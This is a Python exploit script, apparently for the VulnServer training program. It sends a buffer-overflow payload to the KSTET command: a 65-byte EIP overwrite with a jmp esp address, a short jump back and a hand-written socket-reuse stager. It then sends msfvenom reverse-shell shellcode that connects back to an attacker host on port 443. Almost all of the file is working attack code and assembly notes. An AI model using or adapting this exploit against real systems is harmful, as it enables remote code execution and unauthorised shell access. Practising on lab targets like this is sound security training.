
#!/usr/bin/python 

import os
import sys
import time
import socket 

host = "192.168.0.12"
port = 9999


#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.11 LPORT=443 -b "\x00" -a x86 --platform windows -f python
#Payload size: 351 bytes
shellcode =  ""
shellcode += "\xbf\x38\x4c\xb6\xcf\xd9\xcf\xd9\x74\x24\xf4\x5d\x31"
shellcode += "\xc9\xb1\x52\x31\x7d\x12\x03\x7d\x12\x83\xd5\xb0\x54"
shellcode += "\x3a\xd9\xa1\x1b\xc5\x21\x32\x7c\x4f\xc4\x03\xbc\x2b"
shellcode += "\x8d\x34\x0c\x3f\xc3\xb8\xe7\x6d\xf7\x4b\x85\xb9\xf8"
shellcode += "\xfc\x20\x9c\x37\xfc\x19\xdc\x56\x7e\x60\x31\xb8\xbf"
shellcode += "\xab\x44\xb9\xf8\xd6\xa5\xeb\x51\x9c\x18\x1b\xd5\xe8"
shellcode += "\xa0\x90\xa5\xfd\xa0\x45\x7d\xff\x81\xd8\xf5\xa6\x01"
shellcode += "\xdb\xda\xd2\x0b\xc3\x3f\xde\xc2\x78\x8b\x94\xd4\xa8"
shellcode += "\xc5\x55\x7a\x95\xe9\xa7\x82\xd2\xce\x57\xf1\x2a\x2d"
shellcode += "\xe5\x02\xe9\x4f\x31\x86\xe9\xe8\xb2\x30\xd5\x09\x16"
shellcode += "\xa6\x9e\x06\xd3\xac\xf8\x0a\xe2\x61\x73\x36\x6f\x84"
shellcode += "\x53\xbe\x2b\xa3\x77\x9a\xe8\xca\x2e\x46\x5e\xf2\x30"
shellcode += "\x29\x3f\x56\x3b\xc4\x54\xeb\x66\x81\x99\xc6\x98\x51"
shellcode += "\xb6\x51\xeb\x63\x19\xca\x63\xc8\xd2\xd4\x74\x2f\xc9"
shellcode += "\xa1\xea\xce\xf2\xd1\x23\x15\xa6\x81\x5b\xbc\xc7\x49"
shellcode += "\x9b\x41\x12\xdd\xcb\xed\xcd\x9e\xbb\x4d\xbe\x76\xd1"
shellcode += "\x41\xe1\x67\xda\x8b\x8a\x02\x21\x5c\x75\x7a\x29\x97"
shellcode += "\x1d\x79\x29\xa6\x66\xf4\xcf\xc2\x88\x51\x58\x7b\x30"
shellcode += "\xf8\x12\x1a\xbd\xd6\x5f\x1c\x35\xd5\xa0\xd3\xbe\x90"
shellcode += "\xb2\x84\x4e\xef\xe8\x03\x50\xc5\x84\xc8\xc3\x82\x54"
shellcode += "\x86\xff\x1c\x03\xcf\xce\x54\xc1\xfd\x69\xcf\xf7\xff"
shellcode += "\xec\x28\xb3\xdb\xcc\xb7\x3a\xa9\x69\x9c\x2c\x77\x71"
shellcode += "\x98\x18\x27\x24\x76\xf6\x81\x9e\x38\xa0\x5b\x4c\x93"
shellcode += "\x24\x1d\xbe\x24\x32\x22\xeb\xd2\xda\x93\x42\xa3\xe5"
shellcode += "\x1c\x03\x23\x9e\x40\xb3\xcc\x75\xc1\xc3\x86\xd7\x60"
shellcode += "\x4c\x4f\x82\x30\x11\x70\x79\x76\x2c\xf3\x8b\x07\xcb"
shellcode += "\xeb\xfe\x02\x97\xab\x13\x7f\x88\x59\x13\x2c\xa9\x4b"
'''
initial exploit
exploit = "KSTET /.../"
exploit += "A"*65
exploit += "B"*4
exploit += "C"*500
'''

'''
overwriting eip and jmp back

#0x625011af jmp esp
#00B7FA0C  ^EB BA            JMP SHORT 00B7F9C8

eip_offset = 65
eip = "\xaf\x11\x50\x62"
jmp_back = "\xeb\xba"

exploit = "KSTET /.../"
exploit += "\x90"
exploit += "\xcc"*(eip_offset - 1 )
exploit += eip
exploit += jmp_back + "\x90"*(500-len(jmp_back))


'''

'''
00B7F9C8   54               PUSH ESP
00B7F9C9   58               POP EAX
00B7F9CA   83EC 60          SUB ESP,60
00B7F9CD   33D2             XOR EDX,EDX
00B7F9CF   52               PUSH EDX
00B7F9D0   B6 02            MOV DH,2
00B7F9D2   52               PUSH EDX
00B7F9D3   54               PUSH ESP
00B7F9D4   5A               POP EDX
00B7F9D5   83C2 60          ADD EDX,60
00B7F9D8   52               PUSH EDX

00B7F9D9   05 88010000      ADD EAX,188
change to:
add ax, 0x188

00B7F9DE   FF30             PUSH DWORD PTR DS:[EAX]
00B7F9E0   B8 112C2540      MOV EAX,40252C11
00B7F9E5   C1E8 08          SHR EAX,8
00B7F9E8   FFD0             CALL EAX

00B7F9DF   B8 2D264101      MOV EAX,141262D
00B7F9E4   2D 01010101      SUB EAX,1010101
00B7F9E9   FFD0             CALL EAX


'''
#shr eax one
#stager = "\x54\x58\x83\xec\x60\x33\xd2\x52\xb6\x02\x52\x54\x5a\x83\xc2\x60\x52\x66\x05\x88\x01\xff\x30\xb8\x11\x2c\x25\x40\xc1\xe8\x08\xff\xd0"

# mov eax one
stager = "\x54\x58\x83\xec\x60\x33\xd2\x52\xb6\x02\x52\x54\x5a\x83\xc2\x60\x52\x66\x05\x88\x01\xff\x30\xb8\x2d\x26\x41\x01\x2d\x01\x01\x01\x01\xff\xd0"


eip_offset = 65
eip = "\xaf\x11\x50\x62"
jmp_back = "\xeb\xba"

exploit = "KSTET /.../"
exploit += "\x90"
exploit += stager
exploit += "\x90"*(eip_offset - 1 -len(stager))
exploit += eip
exploit += jmp_back + "\x90"*(500-len(jmp_back))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))
s.recv(1024)
s.send(exploit)

time.sleep(5)

s.send(shellcode)
s.close()
